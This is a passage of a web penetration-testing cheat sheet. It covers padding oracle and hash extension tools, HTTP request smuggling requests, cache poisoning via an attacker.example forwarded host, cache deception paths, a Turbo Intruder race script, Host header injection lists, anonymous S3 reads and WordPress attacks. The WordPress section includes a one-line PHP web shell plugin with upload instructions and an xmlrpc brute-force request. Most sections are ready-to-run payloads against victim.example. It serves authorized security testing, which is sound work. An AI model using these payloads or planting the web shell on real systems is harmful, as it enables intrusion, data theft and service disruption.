4. Padding oracle: change the last byte of CT, watch for 500 vs 403 vs "invalid padding". Then PadBuster / `padre`.
5. Hash length extension on `md5(secret || data)` / `sha1(secret || data)`: `hashpump`.
6. JWT — [JWT](#jwt).

```bash
padbuster https://victim.example/profile.php SESSION 8 -cookies SESSION=...
hashpump -s <hex> -d 'user=bob' -k 16 -a '&role=admin'
```

---

## HTTP request smuggling

Front proxy and backend disagree on where a request ends. You prepend a request the proxy does not see.

Only on HTTP/1 backends, or HTTP/2 downgrade. Easy to desync a prod proxy and take the site down — confirm in a lab or on a single isolated host first.

CL.TE (proxy uses Content-Length, backend uses Transfer-Encoding):

```
POST / HTTP/1.1
Host: victim.example
Content-Length: 13
Transfer-Encoding: chunked

0

SMUGGLED
```

TE.CL: swap the headers, smuggle inside the chunk.

HTTP/2 front end that downgrades to HTTP/1 for the backend. HTTP/2 has its own length, so any length header you add is a lie the backend may believe:

- **H2.CL:** you add a `content-length` that is shorter than the body. The backend stops there and treats the rest as the next request.
- **H2.TE:** you add `transfer-encoding: chunked`. The backend ends the request at the `0` chunk.

Burp's HTTP Request Smuggler does the probing; read the report it generates instead of guessing.

Confirm by poisoning the *next* client (you, in Repeater): smuggle a complete `GET /404 HTTP/1.1` and see if your follow-up request gets the 404.

Uses: bypass front-end ACLs (`GET /admin` smuggled), steal other users' requests (the gold), cache poison, login hijack.

---

## Cache poisoning

The cache keys on the URL (and maybe `Host`, `Accept`) and stores a response you influenced with an *unkeyed* input.

Param Miner → "Guess headers". Anything it finds (`X-Forwarded-Host`, `X-Forwarded-Scheme`, `X-Original-URL`) is a candidate.

```
GET / HTTP/1.1
Host: victim.example
X-Forwarded-Host: attacker.example
```

If the page reflects `https://attacker.example/static/app.js` as the script src *and* `Age:` / `X-Cache: hit` appears on a second request without the header, you just poisoned everyone.

Cache deception: make the cache store a *private* page as if it were static.

```
GET /account/settings/foo.js
GET /account/settings%0d%0a.js
GET /account/settings?cb=1.js
GET /account/settings/.css
```

If `/account/settings` dumps PII and the CDN keys on the path suffix, fetch it logged out afterwards.

Fat GET (body on GET) and HTTP method override sometimes land in a cache key the origin ignores.

---

## Race conditions

Two requests, one check. Coupons, limited stock, "use this reset token", balance transfers, promo flags, voting.

Turbo Intruder, HTTP/2 single-packet (twenty requests, one connection, released together):

```python
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=1,
                           engine=Engine.BURP2)
    for _ in range(20):
        engine.queue(target.req, gate='race')
    engine.openGate('race')

def handleResponse(req, is_error):
    table.add(req)
```

Single connection, twenty requests, release together. Look for two `200` on something that should happen once.

Also: two different endpoints that should be atomic (change email + confirm email, redeem + refund). Send both.

---

## Host header and extra headers

Password reset, cache, vhost routing, and some SSRF filters all copy `Host`.

```
Host: attacker.example
Host: victim.example
X-Forwarded-Host: attacker.example
X-Forwarded-For: 127.0.0.1
X-Forwarded-Scheme: http
Forwarded: host=attacker.example
X-Original-URL: /admin
X-Rewrite-URL: /admin
X-Custom-IP-Authorization: 127.0.0.1
```

Absolute-URL request line, some proxies route on it:

```
GET https://internal-admin.victim.example/ HTTP/1.1
Host: victim.example
```

TRACE / TRACK: `TRACE / HTTP/1.1` with a header you set — if it echoes, XSS via header (XST). Rare, still check.

---

## Misconfig

Write these up when they lead somewhere (data, RCE, auth bypass). A missing CSP by itself is a hardening note.

- Default creds and default pages (Tomcat, Jenkins, Grafana, Kibana, phpMyAdmin, WordPress `/wp-login.php`, `admin/admin`).
- Directory listing, backup files, `.git`, `.env`, `web.config`, `application.properties`.
- Debug / profiler (`/__debug__`, `/_profiler`, Django debug 500, Spring `actuator/env`).
- Cloud storage: `*.s3.amazonaws.com` listing, `firebaseio.com/.json`, Azure blobs with `$web`.
- CORS / cookie flags / TRACE — see above.
- Out of date software with a *working* CVE on this instance. Prove it.

S3:

```bash
aws s3 ls s3://bucket-name --no-sign-request
aws s3 cp s3://bucket-name/secret.txt - --no-sign-request
```

---

## WordPress

```
/wp-login.php
/wp-json/wp/v2/users          ← user enum
/?author=1
/xmlrpc.php                   ← pingback SSRF, brute via system.multicall
/wp-content/plugins/
/wp-content/uploads/
/wp-config.php.bak
```

```bash
wpscan --url https://victim.example --enumerate u,p,t --plugins-detection mixed
```

Authenticated RCE: theme editor (`Appearance → Theme File Editor` → `footer.php`), or upload a plugin.

Minimal plugin:

```php
<?php
/**
 * Plugin Name: tot
 */
system($_GET['c']);
```

Zip it, upload as a plugin, visit `/wp-content/plugins/tot/tot.php?c=id`.

xmlrpc brute (noisy):

```
POST /xmlrpc.php
<methodCall><methodName>wp.getUsersBlogs</methodName>
<params><param><value>admin</value></param>
<param><value>Password1</value></param></params></methodCall>
```

---

## Fingerprinting

```
Wappalyzer / BuiltWith / WhatWeb
curl -sI https://victim.example
nuclei -u https://victim.example -tags tech,tech-detect
```

Favicon hash (Shodan `http.favicon.hash:`):

```bash
curl -s -o favicon.ico https://victim.example/favicon.ico
md5sum favicon.ico
# mmh3 hash is what Shodan uses — python3:
python3 -c 'import mmh3,codecs,sys; d=sys.stdin.buffer.read(); print(mmh3.hash(codecs.encode(d,"base64")))' < favicon.ico
```

nmap favicon DB: https://github.com/nmap/nmap/blob/master/nselib/data/favicon-db

Canary token when you need to know *who opened* a report / an uploaded file / a reset email: https://www.canarytokens.org/generate — "web bug / URL token". Not an exploit, a tripwire.

---

## Payload lists worth bookmarking

- PayloadsAllTheThings: https://github.com/swisskyrepo/PayloadsAllTheThings
- PortSwigger XSS cheat sheet: https://portswigger.net/web-security/cross-site-scripting/cheat-sheet
- PortSwigger SQL cheat sheet: https://portswigger.net/web-security/sql-injection/cheat-sheet
- HackTricks web: https://book.hacktricks.wiki/en/pentesting-web/index.html
- SecLists: `/usr/share/seclists`
